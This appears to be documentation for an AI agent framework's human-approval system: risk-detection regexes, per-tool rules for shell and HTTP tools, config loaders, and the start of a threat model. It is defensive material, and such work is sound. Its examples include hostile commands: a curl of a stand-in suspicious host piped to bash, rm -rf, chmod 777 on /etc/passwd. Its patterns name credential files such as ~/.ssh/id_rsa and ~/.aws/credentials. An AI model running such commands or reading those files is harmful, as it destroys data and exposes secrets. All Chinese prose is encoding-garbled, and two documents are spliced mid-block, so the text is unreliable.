### æ¶æ„è®¾è®¡

```yaml
hitl_rules.yaml
â”œâ”€â”€ global: {}               # å…¨å±€è®¾ç½®
â”‚   â”œâ”€â”€ enabled              # å¯ç”¨/ç¦ç”¨å®¡æ‰¹
â”‚   â”œâ”€â”€ default_action       # é»˜è®¤è¡Œä¸º
â”‚   â””â”€â”€ risk_patterns        # å…¨å±€é£é™©æ¨¡å¼ï¼ˆè·¨å·¥å…·æ£€æµ‹ï¼‰
â”‚       â”œâ”€â”€ critical         # ä¸¥é‡é£é™©
â”‚       â”œâ”€â”€ high             # é«˜é£é™©
â”‚       â””â”€â”€ medium           # ä¸­ç­‰é£é™©
â””â”€â”€ tools: {}                # å·¥å…·ç‰¹å®šè§„åˆ™
    â”œâ”€â”€ run_bash_command
    â””â”€â”€ http_fetch
```

### 5.1 Global Settings

```yaml
global:
  enabled: true                    # å¯ç”¨å®¡æ‰¹åŠŸèƒ½
  default_action: allow            # é»˜è®¤å…è®¸æ‰§è¡Œ
```

**é»˜è®¤è¡Œä¸º**:
- `allow`: å…è®¸æ‰§è¡Œï¼ˆå·¥å…·æœªé…ç½®æ—¶ï¼‰
- `ask`: è¯¢é—®ç”¨æˆ·
- `deny`: æ‹’ç»æ‰§è¡Œ

---

### 5.2 Global Risk Patterns - è·¨å·¥å…·æ£€æµ‹

**ç”¨é€”**: æ£€æµ‹æ‰€æœ‰å·¥å…·å‚æ•°ä¸­çš„æ•æ„Ÿä¿¡æ¯å’Œå±é™©æ¨¡å¼

#### Critical Riskï¼ˆä¸¥é‡é£é™©ï¼‰ - æ•æ„Ÿä¿¡æ¯æ³„éœ²

**æ£€æµ‹æ¨¡å¼**:
```yaml
critical:
  patterns:
    - "password\\s*[=:]\\s*['\"]?[\\w.-]+"        # å¯†ç æ˜æ–‡
    - ":\\s*password\\w+"                         # URLä¸­çš„å¯†ç 
    - "api[_-]?key\\s*[=:]\\s*['\"]?[\\w-]+"      # API Key
    - "secret\\s*[=:]\\s*['\"]?[\\w.-]+"          # Secret
    - "token\\s*[=:]\\s*['\"]?[\\w.-]+"           # Token
    - "private[_-]?key"                           # ç§é’¥
    - "BEGIN (RSA|DSA|EC) PRIVATE KEY"            # PEMæ ¼å¼ç§é’¥
  action: require_approval
  reason: "æ£€æµ‹åˆ°æ•æ„Ÿä¿¡æ¯ï¼ˆå¯†ç /å¯†é’¥/ä»¤ç‰Œï¼‰"
```

**æ‹¦æˆªç¤ºä¾‹**:
```python
# âŒ ä¼šè¢«æ‹¦æˆª
write_file("config.py", "API_KEY=sk-123abc")
run_bash_command("curl -H 'token: xyz123' https://api.example.com")
```

---

#### High Riskï¼ˆé«˜é£é™©ï¼‰ - ç³»ç»Ÿæ–‡ä»¶å’Œå±é™©æ“ä½œ

**æ£€æµ‹æ¨¡å¼**:
```yaml
high:
  patterns:
    - "/etc/passwd"                               # ç³»ç»Ÿç”¨æˆ·æ–‡ä»¶
    - "/etc/shadow"                               # ç³»ç»Ÿå¯†ç æ–‡ä»¶
    - "~/.ssh/id_rsa"                            # SSHç§é’¥
    - "~/.aws/credentials"                        # AWSå‡­è¯
    - "\\.pem$"                                   # PEMè¯ä¹¦æ–‡ä»¶
    - "DROP\\s+(TABLE|DATABASE)"                  # SQLåˆ é™¤è¡¨/åº“
    - "DELETE\\s+FROM.*WHERE\\s+1=1"             # SQLåˆ é™¤æ‰€æœ‰è®°å½•
    - "TRUNCATE\\s+TABLE"                         # SQLæ¸…ç©ºè¡¨
  action: require_approval
  reason: "æ£€æµ‹åˆ°é«˜é£é™©æ“ä½œï¼ˆç³»ç»Ÿæ–‡ä»¶/æ•°æ®åº“åˆ é™¤ï¼‰"
```

---

#### Medium Riskï¼ˆä¸­ç­‰é£é™©ï¼‰ - å¯ç–‘æ¨¡å¼

**æ£€æµ‹æ¨¡å¼**:
```yaml
medium:
  patterns:
    - "https?://[^/]*\\d+\\.\\d+\\.\\d+\\.\\d+"  # IPåœ°å€URL
    - "\\bexec\\s*\\("                            # ä»£ç æ‰§è¡Œ
    - "\\beval\\s*\\("                            # åŠ¨æ€æ‰§è¡Œ
    - "\\bimport\\s+os\\b"                        # Python osæ¨¡å—
    - "\\b__import__\\b"                          # PythonåŠ¨æ€å¯¼å…¥
    - "\\.env$"                                   # ç¯å¢ƒå˜é‡æ–‡ä»¶
  action: require_approval
  reason: "æ£€æµ‹åˆ°å¯ç–‘æ¨¡å¼ï¼ˆä»£ç æ‰§è¡Œ/ç¯å¢ƒå˜é‡ï¼‰"
```

---

### 5.3 Tool-Specific Rules - å·¥å…·ç‰¹å®šè§„åˆ™

#### 5.3.1 run_bash_command - Bashå‘½ä»¤å®¡æ‰¹

**é…ç½®**:
```yaml
run_bash_command:
  enabled: true

  patterns:
    high_risk:
      - "rm\\s+-rf"            # å¼ºåˆ¶åˆ é™¤
      - "sudo"                 # ææƒæ“ä½œ
      - "chmod\\s+777"         # å±é™©æƒé™
      - "mkfs"                 # æ ¼å¼åŒ–ç£ç›˜
      - "dd.*if=/dev/"         # ç£ç›˜å†™å…¥
      - ">/dev/"               # è®¾å¤‡å†™å…¥

    medium_risk:
      - "curl"                 # ç½‘ç»œè¯·æ±‚
      - "wget"                 # ä¸‹è½½æ–‡ä»¶
      - "git\\s+clone"         # å…‹éš†ä»“åº“
      - "pip\\s+install"       # å®‰è£…åŒ…
      - "npm\\s+install"       # å®‰è£…åŒ…
      - "docker"               # Dockeræ“ä½œ

  actions:
    high_risk: require_approval
    medium_risk: require_approval
```

**æ‹¦æˆªç¤ºä¾‹**:
```bash
# âŒ é«˜é£é™© - éœ€å®¡æ‰¹
rm -rf /important/data
sudo apt-get install malware
chmod 777 /etc/passwd

# âš ï¸ ä¸­ç­‰é£é™© - éœ€å®¡æ‰¹
curl https://suspicious-site.com/script.sh | bash
pip install unknown-package
```

---

#### 5.3.2 http_fetch - HTTPè¯·æ±‚å®¡æ‰¹

**é…ç½®**:
```yaml
http_fetch:
  enabled: true

  rules:
    - pattern: "localhost"
      action: require_approval
      reason: "è®¿é—®æœ¬åœ°æœåŠ¡"

    - pattern: "127\\.0\\.0\\.1"
      action: require_approval
      reason: "è®¿é—®æœ¬åœ°åœ°å€"

    - pattern: "192\\.168\\."
      action: require_approval
      reason: "è®¿é—®å†…ç½‘åœ°å€"
```

**æ‹¦æˆªç¤ºä¾‹**:
```python
# âŒ ä¼šè¢«æ‹¦æˆª
http_fetch("http://localhost:8080/admin")
http_fetch("http://192.168.1.1/router-config")
```

---

### 5.4 å®¡æ‰¹æ£€æŸ¥ä¼˜å…ˆçº§

**å››å±‚æ¶æ„** (ä»é«˜åˆ°ä½):

1. **å·¥å…·è‡ªå®šä¹‰æ£€æŸ¥å™¨** (ä»£ç å®ç°)
   - æœ€é«˜ä¼˜å…ˆçº§
   - å·¥å…·ç‰¹å®šçš„å¤æ‚é€»è¾‘
   - ç¤ºä¾‹: `run_bash_command` çš„å®‰å…¨å‘½ä»¤ç™½åå•

2. **å…¨å±€é£é™©æ¨¡å¼** (`global.risk_patterns`)
   - è·¨å·¥å…·æ£€æµ‹
   - æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ç³»ç»Ÿæ–‡ä»¶è®¿é—®
   - é€‚ç”¨äºæ‰€æœ‰å·¥å…·

3. **å·¥å…·ç‰¹å®šè§„åˆ™** (`tools.xxx`)
   - å·¥å…·çº§åˆ«çš„ç²¾ç¡®æ§åˆ¶
   - ç¤ºä¾‹: `http_fetch` çš„å†…ç½‘åœ°å€æ£€æµ‹

4. **å†…ç½®é»˜è®¤è§„åˆ™**
   - å…œåº•è§„åˆ™
   - ç¤ºä¾‹: `run_bash_command` çš„å®‰å…¨å‘½ä»¤ç™½åå• (`ls`, `pwd`, `cat`)

---

### 5.5 ç”¨æˆ·ä½“éªŒï¼ˆæç®€ç‰ˆï¼‰

**å®¡æ‰¹æç¤ºæ ¼å¼**:
```
ğŸ›¡ï¸  å·¥å…·å®¡æ‰¹: run_bash_command
   åŸå› : ç½‘ç»œè¯·æ±‚éœ€è¦ç¡®è®¤
   å‚æ•°: curl https://example.com
   æ‰¹å‡†? [y/n] > y
```

**è®¾è®¡åŸåˆ™**:
- âœ… **å¯¹LLMé€æ˜**: å®¡æ‰¹å†³ç­–ä¸åŠ å…¥å¯¹è¯ä¸Šä¸‹æ–‡
- âœ… **èƒ½åŠ›çº§ç²’åº¦**: åŸºäºå‚æ•°å†…å®¹ï¼Œéæ•´ä¸ªå·¥å…·
- âœ… **å››å±‚æ¶æ„**: çµæ´»æ‰©å±•
- âœ… **è·¨å·¥å…·æ£€æµ‹**: å…¨å±€æ¨¡å¼é˜²æ­¢ä¿¡æ¯æ³„éœ²

---

## 6. project_root.py - é¡¹ç›®è·¯å¾„å·¥å…·ï¼ˆ56è¡Œï¼‰

### ç”¨é€”

è§£å†³**è·¨ç›®å½•è¿è¡Œ**é—®é¢˜ï¼Œç¡®ä¿æ— è®ºä»å“ªä¸ªç›®å½•å¯åŠ¨ï¼Œéƒ½èƒ½æ­£ç¡®å®šä½é¡¹ç›®æ–‡ä»¶ã€‚

### æ ¸å¿ƒå‡½æ•°

#### 6.1 get_project_root() - è·å–é¡¹ç›®æ ¹ç›®å½•

**å®ç°**:
```python
@lru_cache(maxsize=1)
def get_project_root() -> Path:
    """è·å–é¡¹ç›®æ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„"""
    # ä»å½“å‰æ–‡ä»¶ä½ç½®æ¨æ–­
    # project_root.py -> config/ -> generalAgent/ -> project_root/
    current_file = Path(__file__).resolve()
    project_root = current_file.parent.parent.parent

    # éªŒè¯: æ£€æŸ¥ generalAgent ç›®å½•æ˜¯å¦å­˜åœ¨
    if not (project_root / "generalAgent").exists():
        raise RuntimeError("Could not locate project root")

    return project_root
```

**ç‰¹ç‚¹**:
- âœ… ç¼“å­˜ç»“æœï¼ˆ`lru_cache`ï¼‰
- âœ… è‡ªåŠ¨éªŒè¯ï¼ˆæ£€æŸ¥ `generalAgent/` ç›®å½•ï¼‰
- âœ… è¿”å›ç»å¯¹è·¯å¾„

**ä½¿ç”¨ç¤ºä¾‹**:
```python
root = get_project_root()
config_file = root / "generalAgent" / "config" / "tools.yaml"
logs_dir = root / "logs"
```

---

#### 6.2 resolve_project_path() - è§£æç›¸å¯¹è·¯å¾„

**å®ç°**:
```python
def resolve_project_path(relative_path: str | Path) -> Path:
    """å°†ç›¸å¯¹äºé¡¹ç›®æ ¹çš„è·¯å¾„è½¬ä¸ºç»å¯¹è·¯å¾„"""
    return get_project_root() / relative_path
```

**ä½¿ç”¨ç¤ºä¾‹**:
```python
logs_dir = resolve_project_path("logs")
tools_config = resolve_project_path("generalAgent/config/tools.yaml")
workspace = resolve_project_path("data/workspace/session-123")
```

---

### ä½¿ç”¨åœºæ™¯

**é—®é¢˜**: åœ¨ä¸åŒç›®å½•è¿è¡Œæ—¶ï¼Œç›¸å¯¹è·¯å¾„ä¼šå¤±æ•ˆ
```bash
# ä»é¡¹ç›®æ ¹è¿è¡Œ - âœ… ç›¸å¯¹è·¯å¾„æœ‰æ•ˆ
cd /project && python main.py

# ä»å­ç›®å½•è¿è¡Œ - âŒ ç›¸å¯¹è·¯å¾„å¤±æ•ˆ
cd /project/generalAgent && python main.py
```

**è§£å†³æ–¹æ¡ˆ**: ä½¿ç”¨ `project_root.py`
```python
from generalAgent.config.project_root import get_project_root

# âœ… æ— è®ºä»å“ªä¸ªç›®å½•è¿è¡Œï¼Œè·¯å¾„éƒ½æ­£ç¡®
root = get_project_root()
config_path = root / "generalAgent" / "config" / "tools.yaml"
```

---

## 7. skill_config_loader.py - Skillsé…ç½®åŠ è½½å™¨ï¼ˆ152è¡Œï¼‰

### æ ¸å¿ƒç±»: SkillConfig

**ç”¨é€”**: åŠ è½½å’Œè§£æ `skills.yaml` é…ç½®æ–‡ä»¶

### 7.1 åˆå§‹åŒ–

```python
class SkillConfig:
    def __init__(self, config_path: Optional[Path] = None):
        self.config_path = config_path
        self.config = self._load_config()
```

**é»˜è®¤é…ç½®** (å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨):
```python
{
    "global": {
        "enabled": True,
        "auto_load_on_file_upload": True,
    },
    "core": [],
    "optional": {},
    "directories": {
        "builtin": "generalAgent/skills",
    },
}
```

---

### 7.2 ä¸»è¦æ–¹æ³•

#### is_enabled() - æ£€æŸ¥å…¨å±€å¯ç”¨çŠ¶æ€
```python
def is_enabled(self) -> bool:
    """æ£€æŸ¥skillsç³»ç»Ÿæ˜¯å¦å…¨å±€å¯ç”¨"""
    return self.config.get("global", {}).get("enabled", True)
```

#### auto_load_on_file_upload() - æ£€æŸ¥è‡ªåŠ¨åŠ è½½
```python
def auto_load_on_file_upload(self) -> bool:
    """æ£€æŸ¥æ˜¯å¦å¯ç”¨æ–‡ä»¶ä¸Šä¼ è‡ªåŠ¨åŠ è½½"""
    return self.config.get("global", {}).get("auto_load_on_file_upload", True)
```

#### get_core_skills() - è·å–æ ¸å¿ƒæŠ€èƒ½åˆ—è¡¨
```python
def get_core_skills(self) -> List[str]:
    """è·å–æ ¸å¿ƒæŠ€èƒ½åˆ—è¡¨ï¼ˆæ€»æ˜¯åŠ è½½ï¼‰"""
    return self.config.get("core", [])
```

#### get_enabled_skills() - è·å–å¯ç”¨æŠ€èƒ½åˆ—è¡¨
```python
def get_enabled_skills(self) -> List[str]:
    """è·å–æ‰€æœ‰å¯ç”¨çš„æŠ€èƒ½"""
    enabled = []
    # æ·»åŠ æ ¸å¿ƒæŠ€èƒ½
    enabled.extend(self.get_core_skills())
    # æ·»åŠ å¯ç”¨çš„å¯é€‰æŠ€èƒ½
    optional = self.config.get("optional", {})
    for skill_id, skill_config in optional.items():
        if skill_config.get("enabled", False):
            enabled.append(skill_id)
    return enabled
```

#### get_skill_config() - è·å–å•ä¸ªæŠ€èƒ½é…ç½®
```python
def get_skill_config(self, skill_id: str) -> Optional[Dict]:
    """è·å–ç‰¹å®šæŠ€èƒ½çš„é…ç½®"""
    # æ£€æŸ¥æ ¸å¿ƒæŠ€èƒ½
    if skill_id in self.get_core_skills():
        return {"enabled": True, "always_available": True}
    # æ£€æŸ¥å¯é€‰æŠ€èƒ½
    optional = self.config.get("optional", {})
    return optional.get(skill_id)
```

#### is_skill_enabled() - æ£€æŸ¥æŠ€èƒ½å¯ç”¨çŠ¶æ€
```python
def is_skill_enabled(self, skill_id: str) -> bool:
    """æ£€æŸ¥æŠ€èƒ½æ˜¯å¦å¯ç”¨"""
    config = self.get_skill_config(skill_id)
    if not config:
        return False
    return config.get("enabled", False) or skill_id in self.get_core_skills()
```

#### get_skills_for_file_type() - æ ¹æ®æ–‡ä»¶ç±»å‹è·å–æŠ€èƒ½
```python
def get_skills_for_file_type(self, file_type: str) -> List[str]:
    """è·å–åº”ä¸ºæ–‡ä»¶ç±»å‹è‡ªåŠ¨åŠ è½½çš„æŠ€èƒ½

    ä¾‹å¦‚: ä¸Šä¼  .pdf æ–‡ä»¶ -> è¿”å› ["pdf"]
    """
    if not self.auto_load_on_file_upload():
        return []

    skills = []
    optional = self.config.get("optional", {})
    for skill_id, skill_config in optional.items():
        auto_load_types = skill_config.get("auto_load_on_file_types", [])
        if file_type.lower() in [t.lower() for t in auto_load_types]:
            skills.append(skill_id)
    return skills
```

---

### 7.3 ä½¿ç”¨ç¤ºä¾‹

```python
from generalAgent.config.skill_config_loader import load_skill_config

# åŠ è½½é…ç½®
skill_config = load_skill_config(Path("generalAgent/config/skills.yaml"))

# æ£€æŸ¥å…¨å±€å¯ç”¨
if skill_config.is_enabled():
    print("Skillsç³»ç»Ÿå·²å¯ç”¨")

# è·å–å¯ç”¨çš„æŠ€èƒ½
enabled_skills = skill_config.get_enabled_skills()
print(f"å¯ç”¨çš„æŠ€èƒ½: {enabled_skills}")  # ['docx', 'xlsx', 'pptx']

# æ ¹æ®æ–‡ä»¶ç±»å‹è·å–æŠ€èƒ½
skills = skill_config.get_skills_for_file_type("pdf")
print(f"PDFæ–‡ä»¶åº”åŠ è½½: {skills}")  # ['pdf']

# æ£€æŸ¥å•ä¸ªæŠ€èƒ½
if skill_config.is_skill_enabled("pdf"):
    print("PDFæŠ€èƒ½å·²å¯ç”¨")
else:
    print("PDFæŠ€èƒ½æœªå¯ç”¨ï¼ˆéœ€@mentionæˆ–ä¸Šä¼ PDFæ–‡ä»¶ï¼‰")
```

---

## 8. __init__.py - æ¨¡å—å¯¼å‡ºï¼ˆ6è¡Œï¼‰

### å†…å®¹

```python
"""Configuration helpers."""

from .settings import Settings, get_settings

__all__ = ["Settings", "get_settings"]
```

### ç”¨é€”

**ç®€åŒ–å¯¼å…¥**:
```python
# âœ… ç®€æ´
from generalAgent.config import get_settings

# âŒ å†—é•¿
from generalAgent.config.settings import get_settings
```

---

## é…ç½®æœ€ä½³å®è·µ

### 1. ç¯å¢ƒå˜é‡ä¼˜å…ˆçº§

**.env æ–‡ä»¶ç»“æ„**:
```bash
# ========== æ¨¡å‹é…ç½® ==========
# DeepSeek åŸºç¡€æ¨¡å‹
MODEL_BASIC_API_KEY=sk-xxx
MODEL_BASIC_BASE_URL=https://api.deepseek.com
MODEL_BASIC_ID=deepseek-chat

# DeepSeek æ¨ç†æ¨¡å‹
MODEL_REASONING_API_KEY=sk-xxx
MODEL_REASONING_BASE_URL=https://api.deepseek.com
MODEL_REASONING_ID=deepseek-reasoner

# GLM è§†è§‰æ¨¡å‹
MODEL_MULTIMODAL_API_KEY=xxx
MODEL_MULTIMODAL_BASE_URL=https://open.bigmodel.cn/api/paas/v4
MODEL_MULTIMODAL_ID=glm-4.5v

# Moonshot å¯¹è¯æ¨¡å‹
MODEL_CHAT_API_KEY=xxx
MODEL_CHAT_BASE_URL=https://api.moonshot.cn/v1
MODEL_CHAT_ID=kimi-k2-0905-preview

# ========== è¿è¡Œæ—¶æ²»ç† ==========
AUTO_APPROVE_WRITES=false
MAX_LOOPS=100
MAX_MESSAGE_HISTORY=500

# ========== ä¸Šä¸‹æ–‡ç®¡ç† ==========
CONTEXT_MANAGEMENT_ENABLED=true
CONTEXT_INFO_THRESHOLD=0.75
CONTEXT_WARNING_THRESHOLD=0.85
CONTEXT_CRITICAL_THRESHOLD=0.95
CONTEXT_KEEP_RECENT_RATIO=0.15
CONTEXT_KEEP_RECENT_MESSAGES=10

# ========== å¯è§‚æµ‹æ€§ ==========
LANGSMITH_PROJECT=my-agent-project
LANGSMITH_API_KEY=lsv2_xxx
LANGCHAIN_TRACING_V2=true

# ========== ä¼šè¯æŒä¹…åŒ– ==========
SESSION_DB_PATH=data/sessions.db
```

---

### 2. YAMLé…ç½®åŸåˆ™

**tools.yaml**:
- âœ… Coreå·¥å…·: ä»…æ ¸å¿ƒå¿…éœ€å·¥å…·ï¼ˆ13ä¸ªï¼‰
- âœ… Optionalå·¥å…·: ç½‘ç»œã€é«˜çº§åŠŸèƒ½ï¼ˆæŒ‰éœ€å¯ç”¨ï¼‰
- âœ… `available_to_subagent`: è°¨æ…è®¾ç½®ï¼ˆé˜²æ­¢æ»¥ç”¨ï¼‰

**skills.yaml**:
- âœ… CoreæŠ€èƒ½: é»˜è®¤ä¸ºç©ºï¼ˆå‡å°‘å¯åŠ¨å¼€é”€ï¼‰
- âœ… `enabled: true`: åªå¯ç”¨å¸¸ç”¨æŠ€èƒ½
- âœ… `auto_load_on_file_types`: åˆç†æ˜ å°„æ–‡ä»¶ç±»å‹

**agents.yaml**:
- âœ… ç²¾ç®€Catalog: åªæ˜¾ç¤ºIDå’Œæè¿°
- âœ… åŠ¨æ€åŠ è½½è¯¦æƒ…: @mentionæ—¶æ‰æ˜¾ç¤ºè¯¦ç»†æŠ€èƒ½
- âœ… `available_to_subagent`: é˜²æ­¢æ— é™é€’å½’

**hitl_rules.yaml**:
- âœ… å…¨å±€æ¨¡å¼: ä¼˜å…ˆé…ç½®ï¼ˆè·¨å·¥å…·æ£€æµ‹ï¼‰
- âœ… å·¥å…·ç‰¹å®šè§„åˆ™: ç²¾ç¡®æ§åˆ¶
- âœ… æ­£åˆ™è¡¨è¾¾å¼: è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ï¼ˆ`\\.`ï¼‰

---

### 3. é…ç½®æ›´æ–°æµç¨‹

**ä¿®æ”¹ç¯å¢ƒå˜é‡**:
1. ç¼–è¾‘ `.env` æ–‡ä»¶
2. é‡å¯åº”ç”¨ï¼ˆPydanticè‡ªåŠ¨åŠ è½½ï¼‰

**ä¿®æ”¹YAMLé…ç½®**:
1. ç¼–è¾‘ `*.yaml` æ–‡ä»¶
2. é‡å¯åº”ç”¨ï¼ˆYAMLåœ¨å¯åŠ¨æ—¶åŠ è½½ï¼‰
3. æœªæ¥: çƒ­é‡è½½æ”¯æŒï¼ˆ`hot_reload: enabled: true`ï¼‰

**é…ç½®éªŒè¯**:
```python
from generalAgent.config import get_settings

settings = get_settings()
print(f"Base model: {settings.models.base}")
print(f"Max loops: {settings.governance.max_loops}")
print(f"Context threshold: {settings.context.critical_threshold}")
```

---

## é…ç½®æ€»ç»“

### é…ç½®æ¶æ„ä¼˜åŠ¿

1. **Pydantic + YAML æ··åˆ**:
   - ç¯å¢ƒå˜é‡ï¼ˆæ•æ„Ÿä¿¡æ¯ï¼‰â†’ `.env` + Pydantic
   - ä¸šåŠ¡é…ç½®ï¼ˆå·¥å…·/æŠ€èƒ½/è§„åˆ™ï¼‰â†’ YAML

2. **è‡ªåŠ¨åŠ è½½**:
   - æ— éœ€æ‰‹åŠ¨ `os.getenv()`
   - ç±»å‹éªŒè¯å’Œé»˜è®¤å€¼
   - åˆ«åæ”¯æŒï¼ˆå…¼å®¹æ—§é…ç½®ï¼‰

3. **æ¨¡å—åŒ–**:
   - 8ä¸ªé…ç½®æ–‡ä»¶ï¼ŒèŒè´£æ¸…æ™°
   - ç‹¬ç«‹ç»´æŠ¤ï¼Œæ˜“äºæ‰©å±•

4. **å¯è§‚æµ‹æ€§**:
   - LangSmithè¿½è¸ª
   - Tokenç›‘æ§
   - å®¡æ‰¹æ—¥å¿—

5. **å®‰å…¨æ€§**:
   - HITLå››å±‚å®¡æ‰¹
   - å…¨å±€é£é™©æ¨¡å¼
   - æ•æ„Ÿä¿¡æ¯æ£€æµ‹

---

## å¿«é€Ÿå‚è€ƒ

### å¸¸ç”¨é…ç½®è·¯å¾„

```python
from generalAgent.config import get_settings
from generalAgent.config.project_root import resolve_project_path

# è·å–è®¾ç½®
settings = get_settings()
max_loops = settings.governance.max_loops

# è·å–é…ç½®æ–‡ä»¶è·¯å¾„
tools_yaml = resolve_project_path("generalAgent/config/tools.yaml")
skills_yaml = resolve_project_path("generalAgent/config/skills.yaml")
agents_yaml = resolve_project_path("generalAgent/config/agents.yaml")
hitl_rules_yaml = resolve_project_path("generalAgent/config/hitl_rules.yaml")

# è·å–æ•°æ®ç›®å½•
workspace_dir = resolve_project_path("data/workspace")
logs_dir = resolve_project_path("logs")
session_db = resolve_project_path("data/sessions.db")
```# å®‰å…¨å’Œéšç§ (Security & Privacy)

## æ¦‚è¿°

AgentGraph æ¡†æ¶å°†å®‰å…¨å’Œéšç§ä¿æŠ¤ä½œä¸ºæ ¸å¿ƒè®¾è®¡åŸåˆ™ï¼Œé€šè¿‡å¤šå±‚é˜²æŠ¤æœºåˆ¶ç¡®ä¿ç”¨æˆ·æ•°æ®å®‰å…¨ã€é˜²æ­¢æ¶æ„æ“ä½œã€ä¿æŠ¤æ•æ„Ÿä¿¡æ¯ã€‚æ¡†æ¶é‡‡ç”¨**çºµæ·±é˜²å¾¡**ç­–ç•¥ï¼Œåœ¨å·¥å…·æ‰§è¡Œã€æ–‡ä»¶è®¿é—®ã€ç½‘ç»œè¯·æ±‚ã€æ•°æ®å­˜å‚¨ç­‰å„ä¸ªç¯èŠ‚å®æ–½å®‰å…¨æ§åˆ¶ã€‚

**å®‰å…¨æ¶æ„ä¸‰å¤§æ”¯æŸ±**ï¼š
1. **HITL äººæœºååŒ** - å±é™©æ“ä½œéœ€äººå·¥å®¡æ‰¹
2. **å·¥ä½œåŒºéš”ç¦»** - æ–‡ä»¶ç³»ç»Ÿæ²™ç®±éš”ç¦»
3. **é…ç½®åŒ–å®‰å…¨** - çµæ´»çš„å®‰å…¨ç­–ç•¥é…ç½®

---

## 1. å¨èƒæ¨¡å‹ä¸é˜²æŠ¤ç­–ç•¥

### 1.1 è¯†åˆ«çš„å¨èƒ

| å¨èƒç±»å‹ | æè¿° | ä¸¥é‡ç¨‹åº¦ | é˜²æŠ¤æªæ–½ |
|---------|------|---------|---------|
| **å‘½ä»¤æ³¨å…¥** | Agent æ‰§è¡Œæ¶æ„ Shell å‘½ä»¤ | Critical | HITL å®¡æ‰¹ + å‘½ä»¤ç™½åå• |
| **æ–‡ä»¶ç³»ç»Ÿç ´å** | åˆ é™¤/ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶ | Critical | å·¥ä½œåŒºéš”ç¦» + è·¯å¾„éªŒè¯ |
| **æ•æ„Ÿä¿¡æ¯æ³„éœ²** | API Key/å¯†ç æ³„éœ²åˆ°æ—¥å¿—/ç½‘ç»œ | Critical | å…¨å±€é£é™©æ¨¡å¼æ£€æµ‹ |
| **è·¯å¾„éå†** | è®¿é—® workspace å¤–çš„æ–‡ä»¶ | High | è·¯å¾„è§„èŒƒåŒ– + å®‰å…¨æ£€æŸ¥ |
| **æ— é™å¾ªç¯** | Agent é™·å…¥æ­»å¾ªç¯æ¶ˆè€—èµ„æº | High | max_loops é™åˆ¶ |
| **Prompt æ³¨å…¥** | ç”¨æˆ·è¾“å…¥ç¯¡æ”¹ Agent è¡Œä¸º | Medium | Jinja2 æ²™ç®± + å‚æ•°åŒ– |
| **ç½‘ç»œæ”»å‡»** | è¯·æ±‚å†…ç½‘/æ¶æ„ç«™ç‚¹ | Medium | HITL å®¡æ‰¹ + URL æ£€æµ‹ |
| **æ•°æ®æ³„éœ²** | ä¼šè¯æ•°æ®è¢«éæˆæƒè®¿é—® | Medium | æœ¬åœ° SQLite + æ–‡ä»¶æƒé™ |

---

## 2. HITL äººæœºååŒé˜²æŠ¤

### 2.1 å››å±‚å®¡æ‰¹æ¶æ„

**ä¼˜å…ˆçº§**: å·¥å…·è‡ªå®šä¹‰æ£€æŸ¥å™¨ > å…¨å±€é£é™©æ¨¡å¼ > å·¥å…·ç‰¹å®šè§„åˆ™ > å†…ç½®é»˜è®¤è§„åˆ™

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Layer 1: å·¥å…·è‡ªå®šä¹‰æ£€æŸ¥å™¨ï¼ˆä»£ç å®ç°ï¼‰      â”‚  æœ€é«˜ä¼˜å…ˆçº§
â”‚ - ä¾‹: check_bash_command(args)          â”‚  å¤æ‚é€»è¾‘
â”‚ - è¿”å›: ApprovalDecision                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Layer 2: å…¨å±€é£é™©æ¨¡å¼ï¼ˆè·¨å·¥å…·æ£€æµ‹ï¼‰       â”‚  æ¬¡é«˜ä¼˜å…ˆçº§
â”‚ - æ•æ„Ÿä¿¡æ¯: password, api_key, token    â”‚  é€‚ç”¨æ‰€æœ‰å·¥å…·
â”‚ - ç³»ç»Ÿæ–‡ä»¶: /etc/passwd, ~/.ssh/        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Layer 3: å·¥å…·ç‰¹å®šè§„åˆ™ï¼ˆhitl_rules.yamlï¼‰ â”‚  ä¸­ä¼˜å…ˆçº§
â”‚ - run_bash_command.patterns.high_risk  â”‚  å·¥å…·çº§æ§åˆ¶
â”‚ - http_fetch.patterns.medium_risk      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Layer 4: å†…ç½®é»˜è®¤è§„åˆ™ï¼ˆå…œåº•é€»è¾‘ï¼‰         â”‚  æœ€ä½ä¼˜å…ˆçº§
â”‚ - å¸¸è§å±é™©å‘½ä»¤: rm -rf, sudo, chmod 777 â”‚  åŸºç¡€ä¿æŠ¤
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 2.2 å…¨å±€é£é™©æ¨¡å¼

**Criticalï¼ˆä¸¥é‡é£é™©ï¼‰** - æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼š

```yaml
critical:
  patterns:
    - "password\\s*[=:]\\s*['\"]?[\\w.-]+"        # å¯†ç æ˜æ–‡
    - "api[_-]?key\\s*[=:]\\s*['\"]?[\\w-]+"      # API Key
    - "secret\\s*[=:]\\s*['\"]?[\\w.-]+"          # Secret
    - "token\\s*[=:]\\s*['\"]?[\\w.-]+"           # Token
    - "private[_-]?key"                           # ç§é’¥
